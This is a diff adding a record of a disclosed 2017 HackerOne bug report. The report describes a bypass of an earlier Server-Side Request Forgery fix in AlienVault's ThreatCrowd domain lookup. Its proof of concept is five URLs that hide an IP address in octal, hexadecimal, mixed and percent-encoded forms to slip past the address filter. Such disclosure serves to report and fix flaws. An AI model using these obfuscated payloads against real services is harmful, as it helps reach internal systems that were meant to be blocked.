@@ -1,0 +1,26 @@
+ReportLink:https://hackerone.com/reports/288537
+WeaknessName:Server-Side Request Forgery (SSRF)
+Reporter:https://hackerone.com/e3xpl0it
+ReportedTo:AlienVault (alienvault_security)
+BountyAmount:
+Severity:high
+State:Closed
+DateOfDisclosure:14.11.2017 15:19:38
+
+Summary:
+
+Hi, you haven't fixed the vulnerability.The bypass of this report #287762
+This is a classic example of url bypass.
+POC
+
+https://www.threatcrowd.org/domain.php?domain=173.0302.0x2c.70
+
+https://www.threatcrowd.org/domain.php?domain=0xad.0xc2.0x2c.0x46
+
+https://www.threatcrowd.org/domain.php?domain=0255.0302.0054.0106
+
+https://www.threatcrowd.org/domain.php?domain=0xad.0302.0x2c.0106
+
+https://www.threatcrowd.org/domain.php?domain=%31%37%33%2E%31%39%34%2E%34%34%2E%37%30
+
+See attached screenshots.
